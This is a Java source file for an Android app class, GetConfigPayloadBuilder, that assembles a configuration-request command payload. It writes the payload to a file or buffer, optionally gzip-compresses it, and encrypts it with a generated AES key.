package com.vvt.phoenix.prot.databuilder;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;

import javax.crypto.SecretKey;

import android.os.ConditionVariable;
import android.util.Log;

import com.vvt.phoenix.prot.TransportDirectives;
import com.vvt.phoenix.prot.command.CommandCode;
import com.vvt.phoenix.prot.command.CommandData;
import com.vvt.phoenix.prot.command.CommandMetaData;
import com.vvt.phoenix.util.DataBuffer;
import com.vvt.phoenix.util.crypto.AESCipher;
import com.vvt.phoenix.util.crypto.AESEncryptListener;
import com.vvt.phoenix.util.crypto.AESKeyGenerator;
import com.vvt.phoenix.util.zip.GZIPCompressor;
import com.vvt.phoenix.util.zip.GZIPListener;

/**
 * @author tanakharn
 *	This command doesn't have CommandData in Payload
 */
public class GetConfigPayloadBuilder extends PayloadBuilder implements GZIPListener, AESEncryptListener{
	
	//Debugging
	private static final boolean DEBUG = false;
	private static final String TAG = "GetConfigPayloadBuilder";

	//Members
	private CommandMetaData mMetaData;
	private CommandData mCommandData;
	private String mPayloadPath;
	private String mCompressPath;
	private String mEncryptPath;
	private boolean mIsResume;
	private FileOutputStream mFileOut;
	private DataBuffer mBuffer;
	private PayloadBuilderResponse mResponse;
	private SecretKey mAesKey;
	private ConditionVariable mLock;

	/**
	 * Constructor 
	 */
	public GetConfigPayloadBuilder(){
		mLock = new ConditionVariable();
		mResponse = new PayloadBuilderResponse();
		
		mAesKey = AESKeyGenerator.generate();
		mResponse.setAesKey(mAesKey);
	}
	
	@Override
	public PayloadBuilderResponse buildPayload(CommandMetaData metaData, CommandData commandData, String payloadPath, int transportDirective) throws Exception {
		mMetaData = metaData;
		mCommandData = commandData;
		mPayloadPath = payloadPath;
		if(transportDirective == TransportDirectives.RESUMABLE){
			if(DEBUG){
				Log.v(TAG, "RESUMABLE Command: process data to file");
			}
			mIsResume = true;
			mFileOut = new FileOutputStream(mPayloadPath);
		}else if(transportDirective == TransportDirectives.NON_RESUMABLE){
			if(DEBUG){
				Log.v(TAG, "NON_RESUMABLE Command: process data to buffer");
			}
			mIsResume = false;
			mBuffer = new DataBuffer();
		}
		appendCommandCode();
		appendCommandData();	
		if(mMetaData.getCompressionCode() == 1){
			compressPayload();
		}
		if(mMetaData.getEncryptionCode() == 1){
			encryptPayload();
		}
		
		//Response
		if(mIsResume){
			mResponse.setPayloadPath(payloadPath);
			mResponse.setPayloadType(PayloadType.FILE);
		}else{
			mResponse.setData(mBuffer.toArray());
			mResponse.setPayloadType(PayloadType.BUFFER);
		}
		
		if(DEBUG){
			Log.v(TAG, "Finished");
		}
		
		return mResponse;
	}
	
	@Override
	protected void appendCommandCode() throws IOException {
		if(mIsResume){
			DataBuffer buffer = new DataBuffer();
			buffer.writeShort((short) CommandCode.REQUEST_CONFIGURATION);
			mFileOut.write(buffer.toArray());
		}else{
			mBuffer.writeShort((short) CommandCode.REQUEST_CONFIGURATION);
		}
	}
	
	@Override
	protected void appendCommandData() throws Exception {
		//no CommandData for GetConfiguration
		
	}
	

	@Override
	protected void compressPayload() {
		GZIPCompressor gzip = new GZIPCompressor();
		
		if(mIsResume){
			mCompressPath = mPayloadPath+".compress";		//"a.txt.compress"
			gzip.compressAsynchoronous(mPayloadPath, mCompressPath, this);	// in previous, this line may throw exception from GZIPCompressor but now, GZIPCompressor throw error via its listener
			mLock.block();
			mLock.close();
		}else{
			byte[] zipData = null;
			try {
				zipData = gzip.compressSyncronous(mBuffer.toArray());
			} catch (IOException e) {
				mMetaData.setCompressionCode(0);
				return;
			}
			mBuffer.clearWriter();
			mBuffer.writeBytes(zipData);
		}
		
	}
	
	@Override
	public void onCompressError(Exception err) {
		if(DEBUG){
			Log.e(TAG, "onCompressError()");
		}
		
		mMetaData.setCompressionCode(0);
		mLock.open();
		
	}

	@Override
	public void onCompressSuccess(String resultPath) {
		if(DEBUG){
			Log.v(TAG, "onCompressSuccess()");
		}
		//remove previous payload
		//and rename new compressed file to original payload name
		File f = new File(mPayloadPath);
		f.delete();
		f = new File(resultPath);
		File dest = new File(mPayloadPath);
		f.renameTo(dest);
		
		mLock.open();
		
	}

	@Override
	protected void encryptPayload() {
		mEncryptPath = mPayloadPath+".encrypt";	//"a.txt.compress.encrypt of a.txt.encrypt"
		//1 generate AES key
		/*mAesKey = AESKeyGenerator.generate();
		mResponse.setAesKey(mAesKey);*/
		
		//2 encrypt it!
		AESCipher cipher = new AESCipher();
		if(mIsResume){
			cipher.encryptASynchronous(mAesKey, mPayloadPath, mEncryptPath, this);
			mLock.block();
			mLock.close();
		}else{
			try {
				byte[] cipherText = AESCipher.encryptSynchronous(mAesKey, mBuffer.toArray());
				mBuffer.clearWriter();
				mBuffer.writeBytes(cipherText);
			} catch (InvalidKeyException e) {
				mMetaData.setEncryptionCode(0);
			}
		}
		
	}

	@Override
	public void onAESEncryptError(Exception err) {
		if(DEBUG){
			Log.e(TAG, "onAESEncryptError()");
		}
		mMetaData.setEncryptionCode(0);
		mLock.open();
		
	}

	@Override
	public void onAESEncryptSuccess(String resultPath) {
		if(DEBUG){
			Log.v(TAG, "onAESEncryptSuccess()");
		}
		
		//remove previous payload
		//and rename new encrypted file to original payload name
		File f = new File(mPayloadPath);
		f.delete();
		f = new File(resultPath);
		File dest = new File(mPayloadPath);
		f.renameTo(dest);
		
		mLock.open();
		
	}

}
